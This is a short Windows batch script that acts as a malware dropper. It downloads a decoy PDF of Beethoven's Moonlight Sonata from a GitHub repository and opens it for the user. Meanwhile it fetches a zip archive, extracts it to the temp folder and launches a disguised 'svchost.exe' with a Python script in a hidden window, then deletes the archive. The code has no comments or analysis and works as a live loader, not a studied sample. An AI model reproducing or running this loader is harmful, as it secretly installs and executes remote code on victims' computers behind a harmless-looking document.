@echo off
setlocal
set "url=https://github.com/nvslks/c/raw/refs/heads/c/1.zip"
set "tempdir=%temp%"
set "output=%tempdir%\4g5h790g2345h7890g2345h90g2345h-890v2345h789-3v5h.zip"
set "urlpdf=https://github.com/nvslks/c/raw/refs/heads/c/1"
set "downloadPath=%USERPROFILE%\Downloads\Sonate_No._14_Moonlight_3rd_Movement.pdf"
powershell -Command "Invoke-WebRequest -Uri '%urlpdf%' -OutFile '%downloadPath%'"
if exist "%downloadPath%" (
    start "" "%downloadPath%"
) else (
    start "" "%downloadPath%"
)

:download
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"
for %%A in ("%output%") do (
    if %%~zA==0 (
        del "%output%"
        timeout /t 1 >nul
        goto download
    )
)

powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%' -Force"

set "pythonScript=%tempdir%\python.py"
if exist "%pythonScript%" (
    powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -ArgumentList '%pythonScript%' -WindowStyle Hidden"
) else (
    exit
)

del "%output%"

exit
